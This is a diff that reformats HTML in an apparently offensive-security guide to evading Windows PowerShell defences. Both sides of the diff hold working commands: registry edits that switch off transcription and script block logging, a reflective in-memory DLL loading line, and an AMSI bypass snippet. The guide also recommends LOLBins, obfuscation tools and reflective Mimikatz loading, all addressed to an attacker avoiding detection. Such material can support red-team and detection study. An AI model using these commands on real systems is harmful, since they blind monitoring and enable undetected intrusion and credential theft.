@@ -353,7 +353,7 @@
 <h3><strong>1. Bypassing System-wide Transcription</strong></h3>
 <p>System-wide transcription logs all commands and outputs in a session. To avoid detection:</p>
 <ul>
-<li><strong>Avoid Native PowerShell Execution</strong>: Instead of running PowerShell directly, use LOLBins like <code>MSBuild.exe</code> or <code>Regsvr32.exe</code>to execute PowerShell scripts indirectly. - <strong>Tamper with Log Paths</strong>: If you have high privileges, alter or disable transcription policies by modifying registry keys or group policies:``<code>powershell Remove-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -Name EnableTranscripting</code>``</li>
+<li><strong>Avoid Native PowerShell Execution</strong>: Instead of running PowerShell directly, use LOLBins like <code>MSBuild.exe</code> or <code>Regsvr32.exe</code>to execute PowerShell scripts indirectly. - <strong>Tamper with Log Paths</strong>: If you have high privileges, alter or disable transcription policies by modifying registry keys or group policies:<code>powershell Remove-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -Name EnableTranscripting</code></li>
 </ul>
 <ul>
 <li><strong>Redirect Output</strong>: Redirect command output to another location that isn’t monitored.</li>
@@ -364,15 +364,18 @@
 <ul>
 <li><strong>Dynamic Code Execution</strong>: Use reflection or in-memory execution to load and execute scripts without creating script blocks:</li>
 </ul>
-<pre><code class="language-powershell-[system.reflection.assembly]::load([io.file]::readallbytes("payload.dll")).entrypoint.invoke($null,-@())```">
-- **Inline Obfuscation**: Obfuscate commands heavily to make them harder to analyze in logs. Tools like Invoke-Obfuscation can automate this.
-- **Indirect Invocation**: Split commands across multiple execution points or use encoded payloads to hide the script logic.
-- **Disable Logging (High Privileges)**: If you have administrative access, disable script block logging:
-  **Example:** An attacker dynamically loads Mimikatz via a reflective DLL loader, which avoids generating script blocks.</code></pre>
+<p><code>powershell [System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes("payload.dll")).EntryPoint.Invoke($null, @())</code></p>
+<ul>
+<li><strong>Inline Obfuscation</strong>: Obfuscate commands heavily to make them harder to analyze in logs. Tools like Invoke-Obfuscation can automate this.</li>
+<li><strong>Indirect Invocation</strong>: Split commands across multiple execution points or use encoded payloads to hide the script logic.</li>
+<li><strong>Disable Logging (High Privileges)</strong>: If you have administrative access, disable script block logging:</li>
+</ul>
+<p><strong>Example:</strong> An attacker dynamically loads Mimikatz via a reflective DLL loader, which avoids generating script blocks.</p>
+<p><code>powershell Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 0</code></p>
 <h3><strong>3. Bypassing AMSI</strong></h3>
 <p>AMSI scans scripts for malicious content. Bypasses include:</p>
 <ul>
-<li><strong>Memory Patching</strong>: Modify <code>AmsiScanBuffer</code>in memory to return a clean status:``<code>powershell $Mem = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::"amsiInitFailed" If ($Mem -eq $null) {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::"amsiInitFailed" = $true}</code>``</li>
+<li><strong>Memory Patching</strong>: Modify <code>AmsiScanBuffer</code>in memory to return a clean status:<code>powershell $Mem = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::"amsiInitFailed" If ($Mem -eq $null) {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::"amsiInitFailed" = $true}</code></li>
 </ul>
 <ul>
 <li><strong>Payload Encryption</strong>: Encrypt payloads and decrypt them in memory just before execution to avoid AMSI detection.</li>
